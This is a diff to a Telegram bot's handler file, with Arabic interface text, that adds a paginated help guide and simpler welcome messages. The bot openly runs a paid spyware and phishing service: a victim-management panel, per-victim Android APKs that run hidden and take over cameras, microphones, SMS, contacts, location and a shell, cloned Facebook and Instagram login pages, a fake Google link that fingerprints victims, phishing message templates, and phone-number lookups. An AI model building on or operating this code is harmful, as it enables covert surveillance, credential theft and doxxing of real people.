@@ -1,7 +1,7 @@
 # bot_handlers.py
 # ============================================================
 # معالجات البوت الرئيسية: /start + callback + step handlers
-# v13 — Facebook + Instagram Fake Sites + Phone Search
+# v14 — ترحيب مبسط + شرح البوت + Phone Search
 # ============================================================
 
 import io
@@ -233,7 +233,7 @@ INSTAGRAM_SITES = {
 
 
 # ============================================================
-# ★★★ إنشاء جلسة Facebook ★★★
+# إنشاء جلسات
 # ============================================================
 def _create_fb_session(chat_id, template_key):
     if not redis_client:
@@ -267,9 +267,6 @@ def _create_fb_session(chat_id, template_key):
         return None
 
 
-# ============================================================
-# ★★★ إنشاء جلسة Instagram ★★★
-# ============================================================
 def _create_ig_session(chat_id, template_key):
     if not redis_client:
         return None
@@ -306,6 +303,7 @@ def _create_ig_session(chat_id, template_key):
 # القوائم
 # ============================================================
 def main_menu(user_id=None):
+    """القائمة الرئيسية"""
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("👥 إدارة الضحايا", callback_data="v_list"))
     markup.add(InlineKeyboardButton("📱 تطبيق الضحية (APK)", callback_data="v_new"))
@@ -320,7 +318,6 @@ def main_menu(user_id=None):
         callback_data="gen_se"
     ))
 
-    # ★★★ Search Engine ★★★
     markup.add(InlineKeyboardButton(
         "🔍 محرك البحث",
         callback_data="search_menu"
@@ -329,6 +326,12 @@ def main_menu(user_id=None):
     markup.add(InlineKeyboardButton("🎯 جمع المعلومات (Silent)", callback_data="gen_silent"))
     markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
     markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
+
+    # ★★★ زر شرح البوت ★★★
+    markup.add(InlineKeyboardButton(
+        "📖 شرح البوت",
+        callback_data="help_guide"
+    ))
 
     markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
     markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
@@ -340,6 +343,7 @@ def main_menu(user_id=None):
 
 
 def main_menu_text(user_id=None):
+    """نص القائمة الرئيسية"""
     if user_id and is_admin(user_id):
         return (
             "👑 <b>القائمة الرئيسية</b>\n"
@@ -365,10 +369,9 @@ def silent_collector_panel():
 
 
 # ============================================================
-# ★★★ Search Engine Panel ★★★
+# Search Engine Panel
 # ============================================================
 def build_search_menu():
-    """القائمة الرئيسية لمحرك البحث"""
     m = InlineKeyboardMarkup()
 
     m.add(InlineKeyboardButton("📱 بحث برقم الهاتف ✨", callback_data="search_phone"))
@@ -405,6 +408,139 @@ def build_instagram_sites_panel():
     return m
 
 
+# ============================================================
+# ★★★ Help Guide — شرح البوت ★★★
+# ============================================================
+HELP_PAGES = [
+    {
+        "title": "📖 شرح البوت - الجزء 1",
+        "subtitle": "نظرة عامة على الأدوات المتاحة",
+        "content": (
+            "🔍 <b>محرك البحث</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "• <b>بحث برقم الهاتف</b>: تحصل على معلومات الرقم من مصادر مفتوحة + خرائط + روابط مباشرة\n"
+            "• <b>بحث بالإيميل</b>: (قريباً)\n"
+            "• <b>بحث باسم المستخدم</b>: (قريباً)\n"
+            "• <b>بحث بفيسبوك / انستقرام</b>: (قريباً)\n\n"
+
+            "🎭 <b>الهندسة الاجتماعية</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "• <b>واتساب</b>: 10 قوالب رسائل جاهزة للتصيد\n"
+            "• <b>البريد الإلكتروني</b>: 10 قوالب احترافية\n"
+            "• أقسام أخرى قادمة قريباً\n\n"
+
+            "🎯 <b>جمع المعلومات (Silent)</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "• ينشئ رابط يبدو كأنه Google\n"
+            "• يجمع بصمة كاملة عن الضحية\n"
+            "• IP + Device + Cookies + Browsers"
+        ),
+    },
+    {
+        "title": "📖 شرح البوت - الجزء 2",
+        "subtitle": "أنظمة APK والضحايا",
+        "content": (
+            "📱 <b>تطبيق الضحية (APK)</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "• تبني APK مخصص لكل ضحية\n"
+            "• يستقبل الأوامر من البوت\n"
+            "• يشتغل في الخلفية بدون إشعار\n\n"
+
+            "👥 <b>إدارة الضحايا</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "• عند كل ضحية: <b>40+ أمر</b>\n"
+            "• 📷 كاميرا (أمامية/خلفية)\n"
+            "• 🎙️ تسجيل صوتي\n"
+            "• 📨 SMS + سجل المكالمات\n"
+            "• 👥 جهات الاتصال + التطبيقات\n"
+            "• 🖼️ الصور + الفيديوهات\n"
+            "• 📍 الموقع + WiFi\n"
+            "• 📋 الحافظة + التنبيهات\n"
+            "• 🔒 قفل الشاشة + Shell\n\n"
+
+            "🔗 <b>روابط التصيد</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "• <b>فيسبوك</b>: 10 قوالب لصفحات دخول\n"
+            "• <b>انستقرام</b>: 10 قوالب احترافية\n"
+            "• صفحة تشبه الأصل بنسبة 95%"
+        ),
+    },
+    {
+        "title": "📖 شرح البوت - الجزء 3",
+        "subtitle": "لوحة التحكم والاشتراكات",
+        "content": (
+            "🌐 <b>لوحة التحكم (ويب)</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "• تدخل من أي متصفح\n"
+            "• قائمة كل ضحاياك\n"
+            "• إرسال أوامر مباشرة\n"
+            "• صور وفيديوهات + خريطة\n"
+            "• إحصائيات مفصلة\n"
+            "• كل مستخدم له لوحة مستقلة\n\n"
+
+            "💎 <b>الاشتراكات والدفع</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "• 💎 باقات متعددة\n"
+            "• ⭐ دفع عبر Telegram Stars\n"
+            "• 🎁 3 استخدامات مجانية في البداية\n"
+            "• 🚀 VIP لكل الميزات بدون حدود\n\n"
+
+            "👤 <b>حسابي</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "• حالة الحساب\n"
+            "• الاستخدام المتاح\n"
+            "• تفاصيل الاشتراك\n\n"
+
+            "━━━━━━━━━━━━━━━━━━\n"
+            "💡 <b>نصيحة:</b> ابدأ بالأدوات المجانية،\n"
+            "وبعدين اشترك للمميزات الكاملة."
+        ),
+    },
+]
+
+
+def build_help_page(index):
+    """يبني صفحة من صفحات الشرح"""
+    if index < 0 or index >= len(HELP_PAGES):
+        index = 0
+
+    page = HELP_PAGES[index]
+
+    text = (
+        f"<b>{page['title']}</b>\n"
+        f"<i>{page['subtitle']}</i>\n"
+        f"━━━━━━━━━━━━━━━━━━\n\n"
+        f"{page['content']}\n\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"📄 <b>الصفحة {index + 1}/{len(HELP_PAGES)}</b>"
+    )
+
+    m = InlineKeyboardMarkup()
+
+    nav = []
+    if index > 0:
+        nav.append(InlineKeyboardButton(
+            "⬅️ السابق",
+            callback_data=f"help_page_{index - 1}"
+        ))
+
+    if index < len(HELP_PAGES) - 1:
+        nav.append(InlineKeyboardButton(
+            "التالي ➡️",
+            callback_data=f"help_page_{index + 1}"
+        ))
+
+    if nav:
+        m.row(*nav)
+
+    m.add(InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="back_to_main"))
+
+    return text, m
+
+
+# ============================================================
+# Victim Commands Panel
+# ============================================================
 def victim_commands_panel(victim_id):
     m = InlineKeyboardMarkup()
 
@@ -585,7 +721,7 @@ def _deny_message(reason, user_id, tool, data=None):
 
 
 # ============================================================
-# /start
+# /start — ترحيب مبسط
 # ============================================================
 @bot.message_handler(commands=['start', 'panel'])
 def start_command(message):
@@ -604,16 +740,15 @@ def start_command(message):
 
     if is_admin(message.from_user.id):
         text = (
-            f"👑 <b>مرحباً أيها الأدمن {h(user_name)}!</b>\n\n"
+            f"👑 <b>مرحباً {h(user_name)}!</b>\n\n"
             f"⚡ صلاحيات كاملة.\n"
             f"💎 VIP لا نهائي.\n\n"
             f"🎛️ اختر أداة:"
         )
     else:
         text = (
-            f"⚡ <b>مرحباً {h(user_name)}</b>\n\n"
-            f"🎯 نظام إدارة الضحايا\n\n"
-            f"🎛️ اختر أداة:"
+            f"👋 <b>مرحباً بك {h(user_name)}!</b>\n\n"
+            f"🎯 اختر الأداة التي تريدها:"
         )
 
     bot.send_message(
@@ -753,6 +888,26 @@ def _handle_callback(call, chat_id, user_id, data):
     """المنطق الفعلي"""
 
     # ============================================================
+    # ★★★ Help Guide ★★★
+    # ============================================================
+    if data == "help_guide":
+        bot.answer_callback_query(call.id)
+        text, m = build_help_page(0)
+        safe_edit(call, text, reply_markup=m)
+        return
+
+    if data.startswith("help_page_"):
+        try:
+            page_index = int(data.replace("help_page_", ""))
+        except ValueError:
+            page_index = 0
+
+        bot.answer_callback_query(call.id)
+        text, m = build_help_page(page_index)
+        safe_edit(call, text, reply_markup=m)
+        return
+
+    # ============================================================
     # ★★★ Search Engine ★★★
     # ============================================================
     if data == "search_menu":
@@ -887,7 +1042,7 @@ def _handle_callback(call, chat_id, user_id, data):
         logger.exception(f"SE handler error: {e}")
 
     # ============================================================
-    # ★★★ Facebook Fake Sites ★★★
+    # Facebook Fake Sites
     # ============================================================
     if data == "gen_fb":
         check = can_use_tool(chat_id, "fb")
@@ -1019,7 +1174,7 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     # ============================================================
-    # ★★★ Instagram Fake Sites ★★★
+    # Instagram Fake Sites
     # ============================================================
     if data == "gen_ig":
         check = can_use_tool(chat_id, "ig")
@@ -1151,7 +1306,7 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     # ============================================================
-    # ★★★ Silent Collector ★★★
+    # Silent Collector
     # ============================================================
     if data == "gen_silent":
         check = can_use_tool(chat_id, "silent")
@@ -2049,10 +2204,9 @@ def _handle_callback(call, chat_id, user_id, data):
 
 
 # ============================================================
-# ★★★ Phone Search Input Handler ★★★
+# Phone Search Input Handler
 # ============================================================
 def phone_search_input_handler(message):
-    """يستقبل الرقم ويبحث عنه"""
     chat_id = message.chat.id
 
     if not message.text:
@@ -2086,7 +2240,6 @@ def phone_search_input_handler(message):
                 except Exception:
                     pass
 
-                # صورة البروفايل
                 tc = result.get('truecaller') or {}
                 if tc.get('photo'):
                     try:
@@ -2099,13 +2252,11 @@ def phone_search_input_handler(message):
                     except Exception as e:
                         logger.warning(f"Photo send error: {e}")
 
-                # أزرار
                 m = InlineKeyboardMarkup()
                 m.add(InlineKeyboardButton("📱 بحث جديد", callback_data="search_phone"))
                 m.add(InlineKeyboardButton("📜 السجل", callback_data="search_history"))
                 m.add(InlineKeyboardButton("🔙 القائمة", callback_data="search_menu"))
 
-                # لو الرسالة طويلة
                 if len(formatted) > 4000:
                     parts = [formatted[i:i+3900] for i in range(0, len(formatted), 3900)]
                     for i, part in enumerate(parts):
